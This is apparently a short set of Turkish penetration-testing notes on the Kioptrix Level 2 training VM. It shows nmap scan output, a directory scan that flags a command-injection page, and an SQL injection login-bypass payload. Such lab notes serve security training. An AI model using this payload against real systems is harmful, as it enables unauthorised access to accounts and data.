# Kioptrix Level 2 — Nmap Ham Çıktı

```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
|_sshv1: Server supports SSHv1
80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.0.52 (CentOS)
111/tcp  open  rpcbind  2 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100024  1            858/tcp   status
443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
|   sslv2: SSLv2 supported (zayıf cipher'lar)
|_http-server-header: Apache/2.0.52 (CentOS)
631/tcp  open  ipp      CUPS 1.1
| http-methods:
|_  Potentially risky methods: PUT
|_http-title: 403 Forbidden
858/tcp  open  status   1 (RPC #100024)
3306/tcp open  mysql    MySQL (unauthorized)

Running: Linux 2.6.X
OS details: Linux 2.6.9 - 2.6.30
```

## Dizin Taraması (ffuf)

```
http://<hedef>/icons/README
http://<hedef>/icons/
http://<hedef>/pingit.php     <-- command injection buradaydı
http://<hedef>/manual/
http://<hedef>/index.php
```

## SQL Injection (login bypass)

```
' or '1'='1#
```
